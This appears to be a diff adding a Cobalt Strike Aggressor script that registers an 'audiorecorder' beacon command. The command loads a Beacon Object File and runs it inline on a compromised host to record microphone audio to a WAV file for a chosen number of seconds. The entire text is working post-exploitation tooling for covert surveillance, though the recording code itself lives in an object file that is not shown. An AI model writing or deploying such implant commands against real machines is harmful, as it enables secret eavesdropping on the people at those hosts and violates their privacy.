@@ -1,0 +1,31 @@
+#Register command
+beacon_command_register(
+    "audiorecorder",
+    "Audio recording BOF, records audio to a WAV format, stores to a user specified file and records for a specified number of seconds",
+    "audiorecorder [outputfile.wav] [secondstorecord]"
+);
+
+alias audiorecorder {
+    local('$barch $handle $data $args');
+    println(@_);
+    
+    # figure out the arch of this session
+    $barch  = barch($1);
+    
+    # read BOF file
+    $handle = openf(script_resource("audiorecorder. $+ $barch $+ .o"));
+    $data = readb($handle, -1);
+    closef($handle);
+    
+    if(size(@_) == 3)
+    {
+    	$args = bof_pack($1, "zi", $2, $3);
+    } else {
+        berror($1, "Incorrect usage");
+        berror($1, beacon_command_detail("audiorecorder"));
+        return;
+    }
+    
+    btask($1, "Executing audiorecorder by jordanjoewatson");
+    beacon_inline_execute($1, $data, "go", $args);
+}
